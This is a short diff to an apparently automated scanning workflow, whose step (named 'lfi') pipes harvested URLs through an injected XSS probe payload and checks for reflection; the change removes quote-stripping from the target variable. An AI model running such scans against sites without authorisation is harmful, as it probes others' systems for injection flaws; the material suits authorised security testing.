@@ -9,4 +9,4 @@ steps:
   - name: lfi
     command: bash
     script: |
-      gau ${target//\"} | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep =  | qsreplace "<img src=x onerror=alert(12345654321)>" | httpx -silent -mc 200 -mr "12345654321"
+      gau ${target} | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep =  | qsreplace "<img src=x onerror=alert(12345654321)>" | httpx -silent -mc 200 -mr "12345654321"
